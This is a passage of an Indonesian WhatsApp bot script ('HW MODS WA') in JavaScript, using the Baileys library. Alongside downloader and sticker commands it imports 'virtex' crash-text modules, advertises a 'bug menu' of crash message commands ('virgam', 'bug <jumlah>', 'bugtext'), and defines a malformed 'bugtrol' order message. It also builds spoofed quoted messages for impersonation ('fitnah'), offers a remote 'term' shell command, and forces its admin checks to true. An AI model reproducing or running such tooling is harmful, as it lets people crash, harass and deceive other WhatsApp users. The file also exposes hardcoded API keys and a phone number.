//================================
// [❗] HW MODS WA
// [❗] MAU REMOD YAH
// [❗] HAHAHAHAHAHA :)

const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
	} = require("@adiwajshing/baileys")
	const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const tik = require('tiktok-scraper-without-watermark')
const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
const hx = require('hxz-api')
const fetch = require('node-fetch');
const Fb = require('fb-video-downloader');
const twitterGetUrl = require("twitter-url-direct")
const phoneNum = require('awesome-phonenumber')
ownerNumbers = ["6285714170944@s.whatsapp.net"]
const gis = require('g-i-s');
const got = require("got");
const imageToBase64 = require('image-to-base64');
const imgbb = require('imgbb-uploader')
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const { virtex, vipi } = require('./lib/virtex.js')
const mathjs = require('mathjs')
const { pinterest } = require('./lib/pinterest')
const { error } = require("qrcode-terminal")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { yta, ytv, igdl, upload, formatDate } = require('./lib/ytdl')
const { webp2mp4File} = require('./lib/webp2mp4')
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const { emoji2 } = require('./lib/emoji2')
const { virtext } = require('./lib/virtext')
const ZeksApi = 'apivinz'
const TobzKey = 'BotWeA'

multi = true // Multi Prefix ( HW MODS WA )
banChats = true
offline = false
targetpc = '6285714170944'
owner = '6285714170944'
fake = 'HW MODS WA'
numbernye = '0'
waktu = '-'
alasan = '-'
pref = '?' // Prefix ( HW MODS WA )
lolkey = 'DELLASGANTENG' //Lolhuman
xteam = 'edd4e2b682326371'

//=================================================//
module.exports = Haikal = async (Haikal, mek) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		global.blocked
        	mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        	const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeJak = moment.tz('Asia/Jakarta').format("HH:mm:ss");
		const timeMak = moment().tz('Asia/Makassar').format("HH:mm:ss");
        const timeJay = moment().tz('Asia/Jayapura').format("HH:mm:ss");
                const type = Object.keys(mek.message)[0]        
                const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
                if (multi){
                   // var prefix = ''
                   var prefix = /^[°•π÷×¶∆£¢€¥®™=|~ !#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~ !#$%^&.?/\\©^z+*,;]/gi) : '-'          	
        	    } else {
        	    prefix = pref
        	    }        	
        	body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		const botNumber = Haikal.user.jid
		const botNumberss = Haikal.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		let sender = isGroup ? mek.participant : mek.key.remoteJid
		// const isSelfNumber = config.NomorSELF
		// const isOwner = sender.id === isSelfNumber
    const isOwner = ownerNumbers.includes(sender)
		const totalchat = await Haikal.chats.all()
		const groupMetadata = isGroup ? await Haikal.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || true
		const isGroupAdmins = groupAdmins.includes(sender) || true
        const conts = mek.key.fromMe ? Haikal.user.jid : Haikal.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? Haikal.user.name : conts.notify || conts.vname || conts.name || '-'


        //MESS
		mess = {
			wait: 'Otewe',
			success: 'Berhasil!',
			wrongFormat: 'Format salah, coba liat lagi di menu',
			error: {
				stick: 'bukan sticker itu:v',
				Iv: 'Linknya error:v'
			},
			only: {
				group: 'Khusus grup ngab',
			}
		}
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }

        const reply = (teks) => {
            Haikal.sendMessage(from, teks, text, {quoted:mek})
        }

        const sendMess = (hehe, teks) => {
            Haikal.sendMessage(hehe, teks, text)
        }

        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? Haikal.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : Haikal.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
        }

                const konsol = (teks) => {
            Haikal.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/deden.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const fakethumb = (teks, yes) => {
            Haikal.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./stik/deden.jpeg'),quoted:mek,caption:yes})
        }
        const fakegroup = (teks) => {
            Haikal.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/deden.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        
        const bugtrol = { 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6285714170944@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": 173388341205594,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": "*HW MODS WA*",
						"orderTitle": "HAIKAL",
						"sellerJid": "6285714170944@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}
					// Fake Link ( HW MODS WA )
const flink = {
"title": fake,
"body": `Subscribe HW MODS WA`,
"previewType": "PHOTO",
"thumbnailUrl": `https://cdn.pixabay.com/photo/2021/07/21/14/42/indonesian-6483193_640.jpg`,
"thumbnail": fs.readFileSync('./stik/Ahhikal.jpeg'),
"sourceUrl": `https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g`
}
					// Dari docs baileys ( HW MODS WA )
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
// {buttonId: 'id1', buttonText: {displayText: 'Button 1'}, type: 1},
// {buttonId: 'id2', buttonText: {displayText: 'Button 2'}, type: 1}
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
Haikal.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
// Nge Eval Terus Gw Sempurnain ( HW MODS WA )
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await Haikal.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
Haikal.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
// Pahamin dari function sendbutimage terus ini cuman gw bedain type ( HAIKAL )
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await Haikal.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
Haikal.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
const freply = (teks) => {
            Haikal.sendMessage(from, teks, text, {quoted:mek, contextInfo:{"externalAdReply":{"title": fake,"body": `Subscribe HW MODS WA`,"previewType": "PHOTO","thumbnailUrl": `https://cdn.pixabay.com/photo/2021/07/21/14/42/indonesian-6483193_640.jpg`,"thumbnail": fs.readFileSync('./stik/Ahhikal.jpeg'),"sourceUrl": `https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g/`}}})
        }
        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        Haikal.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    Haikal.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }   
//FUNCTION
            cekafk(afk)
            if (!mek.key.remoteJid.endsWith('@g.us') && offline){
            if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            Haikal.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
            }
            }   
        if (mek.key.remoteJid.endsWith('@g.us') && offline) {
        if (!mek.key.fromMe){
        if (mek.message.extendedTextMessage != undefined){
        if (mek.message.extendedTextMessage.contextInfo != undefined){
        if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(mek.key.remoteJid)) return
        addafk(mek.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        Haikal.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
          }
        }
            }
          }
        }
      }
    }
    //HW MODS WA
    var prefi = pref
			
if (multi) {
    prefi = `Multi-Prefix`
}
//========================================================================================================================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		        if (!isCmd && mek.message) {
             for (let i of totalchat) {
          Haikal.updatePresence(i.jid, Presence.recording)
                   }
             }
      	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      	//if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
     	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
      	//if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
		if (!mek.key.fromMe && banChats === true) return

switch (command) {    
// MENU HW MODS
case 'hwmenu':
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
					"imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                         "jpegThumbnail": fs.readFileSync('./stik/Ahhikal.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
					 },
						"contentText": `❏HW MODS WA❏
						▬▭▬▭▬▭▬▭▬▬▭▬▭
SELAMAT DATANG
┏━━⊱
┣❏NAMA :   
┣❏UMUR :  
┣❏KOTA : 
┣❏NEGARA :
┣❏ALASAN GUNAKAN BOT :
┗━━⊱
┏━━⊱
┣❏ MENU DI BUTTON
┣❏ MENU BUG <bugmenu>
┣❏ MENU NEW <menuhw>
┣❏ MAKER <modsmenu>
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭
JANGAN LUPA SUBSCRIBE`,
						"footerText": "https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MENU MODS -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
═════{*OWNER*}═════
┏━━⊱
┣❏ ${prefix}off
┣❏ ${prefix}on
┣❏ ${prefix}status
┣❏ ${prefix}owner
┗━━⊱
┏━━⊱ 
═════{*CONVERT*}═════
┗━━⊱
┏━━⊱
┣❏ ${prefix}toimg
┣❏ ${prefix}tomp3
┣❏ ${prefix}tomp4
┣❏ ${prefix}slow
┣❏ ${prefix}fast
┣❏ ${prefix}reverse
┣❏ ${prefix}tourl
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MENU HW -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						

┏━━⊱
═════{*UP STORY*}═════
┗━━⊱
┏━━⊱
┣❏ ${prefix}upswteks
┣❏ ${prefix}upswimage
┣❏ ${prefix}upswvideo
┗━━⊱
┏━━⊱
═════{*FUN*}═════
┗━━⊱
┏━━⊱
┣❏ ${prefix}fitnah
┣❏ ${prefix}fitnahpc
┣❏ ${prefix}kontak
┣❏ ${prefix}apakah
┣❏ ${prefix}kapankah
┣❏ ${prefix}bisakah
┗━━⊱
┏━━⊱
═════{*TAG*}═════
┗━━⊱
┏━━⊱
┣❏ ${prefix}hidetag
┣❏ ${prefix}kontag
┣❏ ${prefix}tagall
┣❏ ${prefix}sticktag
┣❏ ${prefix}totag
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MENU WA -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
═════{*DOWNLOAD*}═════
┏━━⊱
┣❏ ${prefix}ytsearch <query>
┣❏ ${prefix}igstalk <query>
┣❏ ${prefix}play <query>
┣❏ ${prefix}video <query>
┣❏ ${prefix}ytmp3 <link>
┣❏ ${prefix}ytmp4 <link>
┣❏ ${prefix}ig <link>
┣❏ ${prefix}twitter <link>
┣❏ ${prefix}tiktok <link>
┣❏ ${prefix}tiktokaudio <link>
┣❏ ${prefix}fb <link>
┣❏ ${prefix}brainly <query>
┣❏ ${prefix}image <query>
┣❏ ${prefix}anime <random>
┗━━⊱
┏━━⊱
═════{*OTHER*}═════
┗━━⊱
┣❏ ${prefix}self
┣❏ ${prefix}public
┣❏ ${prefix}setthumb
┣❏ ${prefix}settarget
┣❏ ${prefix}setfakeimg
┣❏ ${prefix}setreply
┣❏ ${prefix}ping
┣❏ ${prefix}inspect
┣❏ ${prefix}groupinfo
┣❏ ${prefix}join
┣❏ ${prefix}gets
┣❏ ${prefix}term <code>
┣❏ - x - <code>
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:mek})
Haikal.relayWAMessage(res)
break
case 'bugmenu':
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
					"imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                         "jpegThumbnail": fs.readFileSync('./stik/Ahhikal.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
					 },
						"contentText": `❏HW MODS WA❏
					▬▭▬▭▬▭▬▭▬▬▭▬▭						
══{*VIRGAM OLD*}══
┏━━⊱
┣❏ ${prefix}virgam
┣❏ ${prefix}virgam1
┣❏ ${prefix}virgam2
┣❏ ${prefix}virgam3
┗━━⊱
┏━━⊱ 
══{*VIRGAM NEW*}══
┗━━⊱
┏━━⊱
┣❏ ${prefix}assalamualaikum
┣❏ ${prefix}kal
┣❏ ${prefix}pp
┣❏ ${prefix}bang
┣❏ ${prefix}alah
┗━━⊱
┏━━⊱ 
══{*BUG BOT*}══
┗━━⊱
┏━━⊱
┣❏ ${prefix}hay
┣❏ ${prefix}psp
┣❏ ${prefix}pvp
┣❏ ${prefix}buglokasi
┣❏ ${prefix}bug <jumlah>
┣❏ ${prefix}bugtext <jumlah>
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭
JANGAN LUPA SUBSCRIBE`,
						"footerText": "https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - THANKS YOU -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
JANGAN PAKE SEMBARANGAN
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:mek})
Haikal.relayWAMessage(res)
break
case 'menuhw':
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
					"imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                         "jpegThumbnail": fs.readFileSync('./stik/Ahhikal.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
					 },
						"contentText": `❏HW MODS WA❏
					▬▭▬▭▬▭▬▭▬▬▭▬▭						
══{BOT NULIS}══
┏━━⊱
┣❏ ${prefix}nulis1
┣❏ ${prefix}nulis2
┣❏ ${prefix}nulis3
┗━━⊱
┏━━⊱ 
══{MENU NEW}══
┗━━⊱
┏━━⊱
┣❏ ${prefix}kalkulator
┣❏ ${prefix}smeme
┣❏ ${prefix}attp <text>
┣❏ ${prefix}sticker
┣❏ ${prefix}swm <author|packname>
┣❏ ${prefix}take <author|packname>
┣❏ ${prefix}fdeface
┣❏ ${prefix}emoji
┗━━⊱
┏━━⊱ 
══{OWNER NEW}══
┗━━⊱
┏━━⊱
┣❏ ${prefix}setprefix
┣❏ ${prefix}nowa
┣❏ ${prefix}kick
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭
JANGAN LUPA SUBSCRIBE`,
						"footerText": "https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - THANKS YOU -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
WELCOME TO BOT HW ✓
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:mek})
Haikal.relayWAMessage(res)
break
case 'modsmenu':
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
					"imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                         "jpegThumbnail": fs.readFileSync('./stik/Ahhikal.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
					 },
						"contentText": `❏HW MODS WA❏
					▬▭▬▭▬▭▬▭▬▬▭▬▭						
══{MAKER MENU}══
┏━━⊱
┣❏ ${prefix}meme
┣❏ ${prefix}cat
┣❏ ${prefix}koala
┣❏ ${prefix}bird
┣❏ ${prefix}fox
┗━━⊱
┏━━⊱ 
══{MENU MAKER}══
┗━━⊱
┏━━⊱
┣❏ ${prefix}pinterest
┣❏ ${prefix}searchgc
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭
JANGAN LUPA SUBSCRIBE`,
						"footerText": "https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - THANKS YOU -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
WELCOME TO BOT HW ✓
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:mek})
Haikal.relayWAMessage(res)
break
// Pinterest
case 'pinterest':
if (!q) return reply('yg mau di cari apa?')
pinterest(`${q}`).then( data => {
const amsulah = data.result
const pimterest = amsulah[Math.floor(Math.random() * amsulah.length)]
sendMediaURL (from ,pimterest , `Pinterest : ${q}`)
})
break
// Search Gc ( HW MODS WA )
case 'searchgc':
if (args.length < 1) return reply(`Example :\n${prefix}searchgc Editor Berkelas`)
nae = args.join(" ")
hx.linkwa(nae).then(res => {
teks = '```「 Search Group 」```'
for (let i of res) {
teks += `\n\n•> Group Whatsapp :\n`
